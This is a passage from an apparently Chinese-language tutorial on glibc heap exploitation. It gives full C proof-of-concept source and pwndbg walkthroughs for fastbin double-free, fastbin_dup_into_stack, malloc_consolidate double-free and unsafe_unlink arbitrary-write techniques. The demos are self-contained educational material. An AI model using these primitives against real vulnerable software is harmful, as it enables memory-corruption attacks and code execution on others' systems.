a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二个 malloc(8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三个 malloc(8): %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉第一个\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当我们再次 free %p 的时候, 程序将会崩溃因为 %p 在 free 链表的第一个位置上\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们先 free %p.\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在我们就可以再次 free %p 了, 因为他现在不在 free 链表的第一个位置上\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在空闲链表是这样的 [ %p, %p, %p ]. 如果我们 malloc 三次, 我们会得到两次 %p \n&quot;</span>, a, b, a, a);<br>    <br>    <span class="hljs-keyword">char</span>* d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(d, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p\n&quot;</span>, f);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗 malloc 来返回一个我们可控的区域的指针(在这个例子中，我们可以返回一个栈指针)。</p>
   <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -g fastbin_dup.c -o fastbin_dup<br></code></pre></td></tr></table></figure>

<p> <img src="https://s2.loli.net/2021/12/26/IJ8EZ7QteOms2yr.png" srcset="/img/loading.gif" lazyload></p>
<p>可以看到首先分配三块内存，当free掉第一块内存之后，再free一次该内存块是不行的，因为这时候这块内存刚好在对应的free-list的顶部，再次free这块内存就会被检查到，这里就free第二块内存。现在我们再次free第一块内存，因为它已经不在链表顶部了。</p>
<p>这时候的 free-list 有这三块内存 [0x2502010, 0x2502030, 0x2502010]，如果我们malloc三次的话，就会得到0x2502010两次。</p>
<p>使用pwndbg逐步调试，首先malloc 3个chunk。</p>
<p> <img src="https://s2.loli.net/2021/12/26/WsBCEgcFLiZ9OoX.png" srcset="/img/loading.gif" lazyload></p>
<p>第一个free之后，chunk a被添加到fastbins中。</p>
<p> <img src="https://s2.loli.net/2021/12/26/Dc42gqKOk3NAsmP.png" srcset="/img/loading.gif" lazyload></p>
<p>第二个 free 之后，chunk b 被添加到fastbins中，可以看到在b的fd指针那里已经改成了chunk a的地址了。</p>
<p> <img src="https://s2.loli.net/2021/12/26/fQ8OCIcztrjRWP7.png" srcset="/img/loading.gif" lazyload></p>
<p>   此时，由于chunk a处于bin中第2块的位置，不会被double-free的检查机制检查出来，所以第三个free之后，chunk a再次被添加到fastbins 中。chunk a和chunk b形成了一个环</p>
<p> <img src="https://s2.loli.net/2021/12/26/9Cz8Rwemsoh1lpH.png" srcset="/img/loading.gif" lazyload></p>
<p>   最后再malloc三块内存d、e、f，可以看到0x4444444444444444被改成了 0x4646464646464646，是因为后来申请的 f 跟 d 指向同一块内存区域。</p>
<p> <img src="https://s2.loli.net/2021/12/26/aYAMKF6UpwC27Vv.png" srcset="/img/loading.gif" lazyload></p>
<p>   总结一下，程序展示了fastbins的double-free攻击，可以泄露出一块已经被分配的内存指针。fastbins 可以看成一个后进先出的栈，使用单链表来实现，通过fastbin-&gt;fd来遍历。由于free的过程会对free list做检查，我们不能连续两次free同一个chunk，所以这里在两次free 之间，增加了一次对其他chunk的free 过程，从而绕过了检查顺利执行，然后再malloc三次，就在同一个地址malloc了两次，也就有了两个指向同一块内存区域的指针。</p>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p>​    这个程序更具体地展示了上一个程序所介绍的技巧，通过欺骗malloc 来返回一个我们可控的区域的指针 (在这个例子中，我们可以返回一个栈指针)</p>
<p>​    源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这个例子拓展自 fastbin_dup.c，通过欺骗 malloc 使得返回一个指向受控位置的指针（本例为栈上）\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> stack_var;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想通过 malloc 申请到 %p.\n&quot;</span>, <span class="hljs-number">8</span>+(<span class="hljs-keyword">char</span> *)&amp;stack_var);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先申请3 个 chunk\n&quot;</span>);<br>    <span class="hljs-keyword">char</span>* a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(a, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-keyword">char</span>* b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(b, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-keyword">char</span>* c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(c, <span class="hljs-string">&quot;CCCCCCCC&quot;</span>);<br>    <br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk a: %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk b: %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk c: %p\n&quot;</span>, c);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;free 掉 chunk a\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果还对 %p 进行 free, 程序会崩溃。因为 %p 现在是 fastbin 的第一个\n&quot;</span>, a, a);<br>    <span class="hljs-comment">// free(a);</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先对 b %p 进行 free\n&quot;</span>, b);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来就可以对 %p 再次进行 free 了, 现在已经不是它在 fastbin 的第一个了\n&quot;</span>, a);<br>    <span class="hljs-built_in">free</span>(a);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 的链表是 [ %p, %p, %p ] 接下来通过修改 %p 上的内容来进行攻击.\n&quot;</span>, a, b, a, a);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第一次 malloc(8): %p\n&quot;</span>, d);<br>    <span class="hljs-keyword">char</span>* e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(e, <span class="hljs-string">&quot;EEEEEEEE&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第二次 malloc(8): %p\n&quot;</span>, e);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 表中只剩 [ %p ] 了\n&quot;</span>, a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来往 %p 栈上写一个假的 size，这样 malloc 会误以为那里有一个空闲的 chunk，从而申请到栈上去\n&quot;</span>, a);<br>    stack_var = <span class="hljs-number">0x20</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在覆盖 %p 前面的 8 字节，修改 fd 指针指向 stack_var 前面 0x20 的位置\n&quot;</span>, a);<br>    *d = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>) (((<span class="hljs-keyword">char</span>*)&amp;stack_var) - <span class="hljs-keyword">sizeof</span>(d));<br>    <br>    <span class="hljs-keyword">char</span>* f = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(f, <span class="hljs-string">&quot;FFFFFFFF&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;第三次 malloc(8): %p, 把栈地址放到 fastbin 链表中\n&quot;</span>, f);<br>    <span class="hljs-keyword">char</span>* g = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">strcpy</span>(g, <span class="hljs-string">&quot;GGGGGGGG&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这一次 malloc(8) 就申请到了栈上去: %p\n&quot;</span>, g);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    gcc -g fastbin_dup_into_stack.c -o fastbin_dup_into_stack</p>
<p>​    这个程序展示了怎样通过修改fd指针，将其指向一个伪造的free chunk，在伪造的地址处malloc出一个chunk。该程序大部分内容都和上一个程序一样，漏洞也同样是double-free，只有给 fd 填充的内容不一样。</p>
<p>​    三次malloc之后</p>
<p> <img src="https://s2.loli.net/2021/12/26/yS1GaoiTJD6dL7k.png" srcset="/img/loading.gif" lazyload></p>
<p>​    三次 free 之后，可以看到由于 double free 造成的循环的指针。</p>
<p> <img src="https://s2.loli.net/2021/12/26/ip2LPoaBOdmU9bY.png" srcset="/img/loading.gif" lazyload></p>
<p>​    这时候我们再去malloc两次，还剩一个指向chunk a的free chunk，而前面我们也申请到了指向它的 chunk d，可以通过它编辑chunk a的fd 指针，填充一个有意义的地址：栈地址减0x8（因为伪造的chunk要有个 size，size在&amp;stack_var - 0x8的位置上）</p>
<p>​    <code>*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></p>
<p>   通过调试我们可以看到，地址为<code>0x603000</code>的<code>chunk</code>的<code>fd</code>指针指向的是栈上的地址，这样的话，malloc一次之后再次申请的时候就会申请到fd指针指向的0x7fffffffdac0</p>
<p> <img src="https://s2.loli.net/2021/12/26/zyAWqFnrboTB2X9.png" srcset="/img/loading.gif" lazyload></p>
<p>最后可以看到我们已经分配栈上的内存，并写入了数据GGGGGGGG。</p>
<p> <img src="https://s2.loli.net/2021/12/26/1VnfpvsWY9HIq4K.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>这个程序展示了利用在large bin的分配中malloc_consolidate 机制绕过 fastbin对double free的检查，这个检查在 fastbin_dup中已经展示过了，只不过它利用的是在两次 free 中间插入一次对其它chunk的free。</p>
<p>​    源码如下。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p1, <span class="hljs-string">&quot;AAAAAAAA&quot;</span>);<br>    <span class="hljs-keyword">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p2, <span class="hljs-string">&quot;BBBBBBBB&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;先 free p1\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-keyword">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n&quot;</span>);<br>    <span class="hljs-keyword">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p4, <span class="hljs-string">&quot;CCCCCCC&quot;</span>);<br>    <span class="hljs-keyword">void</span>* p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">strcpy</span>(p5, <span class="hljs-string">&quot;DDDDDDDD&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n&quot;</span>, p4, p5);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​    运行结果。</p>
<p> <img src="https://s2.loli.net/2021/12/26/BjUekKNVGlQXFJW.png" srcset="/img/loading.gif" lazyload></p>
<p>​    首先分配两个fastbin范围内的chunk。</p>
<p> <img src="https://s2.loli.net/2021/12/26/4ywNIAQ9JtSiejq.png" srcset="/img/loading.gif" lazyload></p>
<p>​    释放掉p1，则空闲的chunk进入fastbin</p>
<p> <img src="https://s2.loli.net/2021/12/26/Zy6USAriPhuIRgK.png" srcset="/img/loading.gif" lazyload></p>
<p>​    此时如果我们再次释放 p1，必然触发 double free 异常，然而，如果此时分配一个 large chunk，效果如下：</p>
<p> <img src="https://s2.loli.net/2021/12/26/y74YorLXn1PRiMJ.png" srcset="/img/loading.gif" lazyload></p>
<p>   可以看到 fastbins 中的 chunk 已经不见了，反而出现在了 small bins 中，并且 chunk p2 的 prev_size 和 size 字段都被修改。</p>
<p>​    看一下large chunk的分配过程：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="hljs-comment">     While it might look excessive to kill all fastbins before</span><br><span class="hljs-comment">     even seeing if there is space available, this avoids</span><br><span class="hljs-comment">     fragmentation problems normally associated with fastbins.</span><br><span class="hljs-comment">     Also, in practice, programs tend to have runs of either small or</span><br><span class="hljs-comment">     large requests, but less often mixtures, so consolidation is not</span><br><span class="hljs-comment">     invoked all that often in most programs. And the programs that</span><br><span class="hljs-comment">     it is called frequently in otherwise tend to fragment.</span><br><span class="hljs-comment">   */</span><br><span class="hljs-keyword">else</span><br>&#123;<br>      idx = largebin_index (nb);<br><span class="hljs-keyword">if</span>(have_fastchunks (av))<br>        malloc_consolidate (av);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>   在分配large chunk的时候，首先会根据chunk的大小来获取对应的 large bin的index，然后判断fast bins中有没有chunk，如果有就调用 malloc_consolidate()合并fast bins中的chunk，然后放到unsorted bin 中。unsorted bin中的chunk 会按照大小放到small或large bins中</p>
<p>   p1已经不再fastbin的顶部，所以可以再次free。那么p1再次被free之后既在small bins又在fast bins。</p>
<p> <img src="https://s2.loli.net/2021/12/26/EXB6RlLAI9hNeoi.png" srcset="/img/loading.gif" lazyload></p>
<p>  再一次 malloc 之后会从 fast bins 中分配</p>
<p>  void *p4 = malloc(0x10);</p>
<p>  strcpy(p4, “CCCCCCC”);</p>
<p>​    可以看到堆块被写入了CCCCCCC。</p>
<p> <img src="https://s2.loli.net/2021/12/26/FDcqGbesp4BZoUt.png" srcset="/img/loading.gif" lazyload></p>
<p>  再一次就是从 small bins 中分配</p>
<p>  void *p5 = malloc(0x10);</p>
<p>  strcpy(p5, “DDDDDDDD”);</p>
<p> <img src="https://s2.loli.net/2021/12/26/xo5yCTlZS2fzkdY.png" srcset="/img/loading.gif" lazyload></p>
<p>​    可以看到堆块的内容被覆盖成DDDDDDDD了，这是因为p4和p5被分配在了同一个地方，修改p5处的内容其实就是修改p4处的内容。</p>
<h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe_unlink"></a>unsafe_unlink</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-keyword">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;当您在已知位置有指向某个区域的指针时，可以调用 unlink\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;最常见的情况是易受攻击的缓冲区，可能会溢出并具有全局指针\n&quot;</span>);<br><br>    <span class="hljs-keyword">int</span> malloc_size = <span class="hljs-number">0x80</span>; <span class="hljs-comment">//要足够大来避免进入 fastbin</span><br>    <span class="hljs-keyword">int</span> header_size = <span class="hljs-number">2</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;本练习的重点是使用 free 破坏全局 chunk0_ptr 来实现任意内存写入\n\n&quot;</span>);<br><br>    chunk0_ptr = (<span class="hljs-keyword">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-keyword">uint64_t</span> *chunk1_ptr  = (<span class="hljs-keyword">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;全局变量 chunk0_ptr 在 %p, 指向 %p\n&quot;</span>, &amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们想要破坏的 chunk 在 %p\n&quot;</span>, chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;在 chunk0 那里伪造一个 chunk\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;next_free_chunk&#x27; (也就是 fd) 指向 &amp;chunk0_ptr 使得 P-&gt;fd-&gt;bk = P.\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint64_t</span>)*<span class="hljs-number">3</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;我们设置 fake chunk 的 &#x27;previous_free_chunk&#x27; (也就是 bk) 指向 &amp;chunk0_ptr 使得 P-&gt;bk-&gt;fd = P.\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过上面的设置可以绕过检查: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint64_t</span>)*<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 fd: %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*) chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Fake chunk 的 bk: %p\n\n&quot;</span>,(<span class="hljs-keyword">void</span>*) chunk0_ptr[<span class="hljs-number">3</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在假设 chunk0 中存在一个溢出漏洞，可以更改 chunk1 的数据\n&quot;</span>);<br>    <span class="hljs-keyword">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;通过修改 chunk1 中 prev_size 的大小使得 chunk1 在 free 的时候误以为 前面的 free chunk 是从我们伪造的 free chunk 开始的\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;如果正常的 free chunk0 的话 chunk1 的 prev_size 应该是 0x90 但现在被改成了 %p\n&quot;</span>,(<span class="hljs-keyword">void</span>*)chunk1_hdr[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;接下来通过把 chunk1 的 prev_inuse 改成 0 来把伪造的堆块标记为空闲的堆块\n\n&quot;</span>);<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;现在释放掉 chunk1，会触发 unlink，合并两个 free chunk\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(chunk1_ptr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;此时，我们可以用 chunk0_ptr 覆盖自身以指向任意位置\n&quot;</span>);<br>    <span class="hljs-keyword">char</span> victim_string[<span class="hljs-number">8</span>];<br>    <span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">uint64_t</span>) victim_string;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr 